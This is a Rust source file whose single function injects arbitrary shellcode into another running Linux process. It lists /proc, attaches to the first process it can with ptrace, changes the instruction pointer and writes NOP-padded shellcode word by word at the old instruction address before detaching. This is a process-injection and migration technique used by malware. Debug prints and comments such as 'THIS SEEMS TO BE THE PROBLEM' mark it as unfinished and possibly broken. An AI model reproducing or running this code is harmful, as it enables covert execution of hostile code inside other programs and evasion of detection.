extern crate nix;
use nix::sys::ptrace::{attach, detach, getregs, read, setregs, write};
use nix::sys::wait::{waitpid, WaitPidFlag};
use nix::unistd::Pid;
use std::process::{self, Command};
use std::ffi::c_void;
use std::mem;

pub fn inject_and_migrate(shellcode: &[u8]) {
    println!("I AM {}", process::id());
    // Find the pointer size (in bytes) for the operating system
    // DO I NEED WORD SIZE OR SOMETHING ELSE? PTRACE SEEMS TO PEEK/POKE 8 BYTES
    let pointer_byte_size = mem::size_of::<usize>();

    // Mutate the shellcode; left pad it with nops to a length divisible by WORD size
    let original_shellcode_size = shellcode.len();
    let padded_size = original_shellcode_size + (pointer_byte_size - original_shellcode_size % pointer_byte_size) + 2 * pointer_byte_size;
    let mut shellcode = shellcode.to_vec();
    shellcode.resize(padded_size, 0x90);
    shellcode.rotate_right(padded_size - original_shellcode_size);

    // Find a PID that ptrace can attach to
    let mut target_pid = 0;
    let list_pids = Command::new("ls")
            .arg("/proc/")
            .output()
            .unwrap();
    let mut pids: Vec<i32> = String::from_utf8(list_pids.stdout)
                                                        .unwrap()
                                                        .split('\n')
                                                        .flat_map(|s| s.parse().ok())
                                                        .collect();
    pids.retain(|i| *i > 100 && *i != process::id() as i32);
    for pid in pids.iter().rev() {
        if attach(Pid::from_raw(*pid)).is_ok() {
            target_pid = *pid;
            break;
        };
    }
    if target_pid == 0 {
        panic!("Could not find a process whose memory can be manipulated");
    }

    let debug_command = Command::new("ps")
            .arg("-p")
            .arg(target_pid.to_string())
            .arg("-o")
            .arg("command")
            .output()
            .unwrap();
    let command_output = String::from_utf8(debug_command.stdout)
                                            .unwrap();
    let command_output = command_output.trim().to_string();
    println!("TARGET PID {}", target_pid);
    println!("TARGET {}", command_output);

    // Wait for the process to change to a stopped state, then dump registers
    let target_pid = Pid::from_raw(target_pid);
    if let Err(error) = waitpid(target_pid, Some(WaitPidFlag::WUNTRACED)) {
        panic!("Could not wait for target process to change state: {}", error);
    }
    let mut registers = match getregs(target_pid) {
        Err(error) => panic!("Could not get registers for target process: {}", error),
        Ok(value) => value
    };

    // Modify registers similar to how http://phrack.org/issues/59/12.html did
    //registers.rsp -= 4;
    //if let Err(error) = unsafe { write(target_pid, registers.rsp as *mut c_void, registers.rip as *mut c_void) }{
    //    panic!("Unable to write RIP to RSP in target process: {}", error);
    //}
    //let mut point = registers.rsp - 1024;
    //registers.rip = registers.rsp - 1022;
    let mut point = registers.rip;
    registers.rip += 8;
    println!("POINT {:?} RIP {:?}", point as *mut c_void, registers.rip as *mut c_void);
    if let Err(error) = setregs(target_pid, registers) {
        panic!("Unable to reset target process registers: {}", error);
    }
    println!("{:?}", registers);

    // Write shellcode to target process one WORD at a time
    let shellcode_chunks: Vec<&[u8]> = shellcode.chunks(pointer_byte_size).collect();
    for chunk in shellcode_chunks {
        // 8 BYTE WORD?? LITTLE ENDIAN
        let idk: u64 = (chunk[0] as u64) << 0 | (chunk[1] as u64) << 8 | (chunk[2] as u64) << 16 | (chunk[3] as u64) << 24 | (chunk[4] as u64) << 32 | (chunk[5] as u64) << 40 | (chunk[6] as u64) << 48 | (chunk[7] as u64) << 56;
        // 4 BYTE WORD?? LITTLE ENDIAN
        //let idk: u32 = (chunk[0] as u32) << 0 | (chunk[1] as u32) << 8 | (chunk[2] as u32) << 16 | (chunk[3] as u32) << 24;
        println!("WRITING VALUE {:?} ({:x}) FROM {:p} TO {:?}", chunk, idk, chunk, point as *mut c_void);
        if let Err(error) = unsafe { write(target_pid, point as *mut c_void, idk as *mut c_void) } {
            panic!("Unable to write portion of shellcode at {:p} to target process: {}", chunk, error);
        }
        let pre_point = point - 8;
        // THIS SEEMS TO BE THE PROBLEM. THE POINTER IS BEING WRITTEN TO THE PROCESS, NOT THE DATA
        if let Ok(stuff) = read(target_pid, point as *mut c_void) {
            assert_eq!(8, mem::size_of_val(&stuff));
            println!("Read {:x} from {:?}", stuff, point as *mut c_void);
        }
        point += pointer_byte_size as u64;
        //point += 1;
    }

    let mut registers = match getregs(target_pid) {
        Err(error) => panic!("Could not get registers for target process: {}", error),
        Ok(value) => value
    };
    println!("{:x}", registers.rip);
    println!("{:?}", registers);

    // Detach from the process so it can resume execution
    if let Err(error) = detach(target_pid, None) {
        panic!("Unable to detach from target process: {}", error);
    }
    
    println!("DONE?");
}
